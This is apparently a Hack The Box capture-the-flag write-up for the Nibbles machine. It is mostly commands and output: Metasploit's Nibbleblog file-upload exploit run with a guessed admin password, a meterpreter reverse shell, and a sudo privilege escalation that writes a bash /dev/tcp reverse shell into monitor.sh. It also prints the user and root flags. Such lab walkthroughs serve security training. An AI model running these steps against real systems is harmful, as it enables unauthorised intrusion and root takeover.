# nibbles: https://app.hackthebox.com/machines/Nibbles

```bash
curl http://10.10.10.75

<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
```bash
searchsploit nibbleblog       
------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                             |  Path
------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                     | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                      | php/remote/38489.rb

```
```bash
search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability

Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.10.10.75
RHOSTS => 10.10.10.75

msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST 10.10.14.13
LHOST => 10.10.14.13

msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI nibbleblog
TARGETURI => nibbleblog

```

```bash
https://github.com/dignajar/nibbleblog/blob/master/admin/boot/sitemap.bit

<?php
// =====================================================================
//	RULES
// =====================================================================
require_once('rules/1-fs_php.bit');
require_once('rules/2-objects.bit');
require_once('rules/3-variables.bit');
require_once('rules/4-blacklist.bit');
require_once('rules/5-url.bit');

require_once('rules/8-posts_pages_sitemap.bit');

require_once('rules/99-misc.bit');
?>
```

```bash
curl http://10.10.10.75/nibbleblog/content/private/users.xml | grep -i username

<users><user username="admin"><id type="integer">0</id><session_fail_count type="integer">0</session_fail_count><session_date type="integer">1514544131</session_date></user><blacklist type="string" ip="10.10.10.1"><date type="integer">1512964659</date><fail_count type="integer">1</fail_count></blacklist></users>
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles

#the password is guessed
```

```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.13:4444 
[*] Sending stage (39927 bytes) to 10.10.10.75
[+] Deleted image.php
```

```bash
meterpreter > shell
Process 1605 created.
Channel 0 created.
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
which python3
/usr/bin/python3
python3 -c "import pty;pty.spawn('/bin/bash')"
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
```

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$  cd /home                    
nibbler@Nibbles:/home$ ls
ls
nibbler
nibbler@Nibbles:/home$ cd nibbler
cd nibbler
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
f4589cb492b79f67e8a08bd28c3cdaee
```

```bash
nibbler@Nibbles:/home$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```bash
nibbler@Nibbles:/home$ cat /home/nibbler/personal/stuff/monitor.sh
cat /home/nibbler/personal/stuff/monitor.sh
cat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory
```

```bash
meterpreter > shell
Process 1742 created.
Channel 0 created.

python3 -c "import pty;pty.spawn('/bin/bash')"

nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home

nibbler@Nibbles:/home$ mkdir -p /home/nibbler/personal/stuff/

mkdir -p /home/nibbler/personal/stuff/

nibbler@Nibbles:/home$ echo 'bash -c "bash -i >& /dev/tcp/10.10.14.13/9999 0>&1"' > /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/home$ chmod +x /home/nibbler/personal/stuff/monitor.sh

chmod +x /home/nibbler/personal/stuff/monitor.sh

nibbler@Nibbles:/home$ sudo /home/nibbler/personal/stuff/monitor.sh
```

```bash
nc -lvnp 9999               
listening on [any] 9999 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.75] 37656

root@Nibbles:/home# cat /root/root.txt
cat /root/root.txt
e851f2b5e7ba9d7c8ce70fcdc2ac0fea
root@Nibbles:/home# 
```

***References*** <br>
<https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html> <br>
<https://www.revshells.com/>
